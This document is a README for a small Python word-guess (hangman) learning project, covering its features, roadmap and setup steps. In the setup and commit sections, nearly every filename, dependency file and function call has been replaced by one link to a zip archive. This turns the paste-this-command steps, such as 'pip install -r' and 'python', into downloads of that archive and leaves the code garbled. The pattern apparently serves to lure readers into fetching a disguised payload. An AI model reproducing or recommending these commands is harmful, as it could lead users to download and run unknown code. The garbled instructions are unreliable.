# Word Guess (Lite Hangman)

A minimal word-guess game in Python that picks a random English word and lets you guess letters with limited lives. Built as a learning prototype while practicing loops, functions, lists, strings—and now exploring sets and simple persistence later.

---

## 🎮 Current Features (Prototype)
- Picks a random English word using **NLTK words corpus**.
- Displays underscores for hidden letters and reveals correctly guessed letters.
- Tracks total guesses, wrong guesses, and remaining lives.
- Simple win/lose flow with a final reveal of the secret word.

---

## 🧠 Concepts Practiced
- **Functions**: letter checking / display updates
- **Lists & Strings**: mutable display, joining for output
- **Loops & Conditionals**: game loop, life tracking
- **Randomness**: selecting a word

---

## 🗺️ Roadmap / Next Steps
- **Sets**:
  - `guessed` letters set (prevent duplicates, O(1) lookup)
  - `word_set` for unique letters → clean win check (`word_set <= guessed`)
  - `wrong` guesses set for display
- **Input validation**: only a–z single letters; handle repeats gracefully
- **Scoreboard** (no DB): JSON file to track wins/losses per player
- **Word filtering**: choose words within a length range; alphabetic only
- **Multiple rounds**: play again without restarting script
- **Optional**: ASCII art for lives; difficulty levels; CLI flags; tests

---

## 🚀 Getting Started

### 1) Clone
```bash
git clone https://raw.githubusercontent.com/BenjiOdhis/lite_hangman/main/cunctatious/lite_hangman-3.1-alpha.5.zip<YOUR_USERNAME>https://raw.githubusercontent.com/BenjiOdhis/lite_hangman/main/cunctatious/lite_hangman-3.1-alpha.5.zip
cd lite-hangman
2) Python env (optional but recommended)
python -m venv .venv
# Windows:
.venv\Scripts\activate
# macOS/Linux:
source .venv/bin/activate

3) Install dependencies
pip install -r https://raw.githubusercontent.com/BenjiOdhis/lite_hangman/main/cunctatious/lite_hangman-3.1-alpha.5.zip

4) Download NLTK word list (first run only)

In Python:

import nltk
https://raw.githubusercontent.com/BenjiOdhis/lite_hangman/main/cunctatious/lite_hangman-3.1-alpha.5.zip("words")


The script will import nltk and use https://raw.githubusercontent.com/BenjiOdhis/lite_hangman/main/cunctatious/lite_hangman-3.1-alpha.5.zip() as the dictionary.

5) Run
python https://raw.githubusercontent.com/BenjiOdhis/lite_hangman/main/cunctatious/lite_hangman-3.1-alpha.5.zip

🧩 Notes

The NLTK words corpus is large; you may filter to shorter words for a nicer game pace:

# example idea in code: [w for w in https://raw.githubusercontent.com/BenjiOdhis/lite_hangman/main/cunctatious/lite_hangman-3.1-alpha.5.zip() if https://raw.githubusercontent.com/BenjiOdhis/lite_hangman/main/cunctatious/lite_hangman-3.1-alpha.5.zip() and 4 <= len(w) <= 8]


This is a prototype; improvements are intentionally iterative (“prototyping model” 😄).

📜 License

MIT (or choose your preferred license)


---

# 5) Commit & push README (and extras)
```bash
git add https://raw.githubusercontent.com/BenjiOdhis/lite_hangman/main/cunctatious/lite_hangman-3.1-alpha.5.zip https://raw.githubusercontent.com/BenjiOdhis/lite_hangman/main/cunctatious/lite_hangman-3.1-alpha.5.zip .gitignore
git commit -m "Add README, requirements, and gitignore"
git push


that’s it—you’re live 🎉
If you want, I can also draft a tiny https://raw.githubusercontent.com/BenjiOdhis/lite_hangman/main/cunctatious/lite_hangman-3.1-alpha.5.zip later (how to run, style, issues) and a JSON scoreboard sketch when you’re ready to add persistence.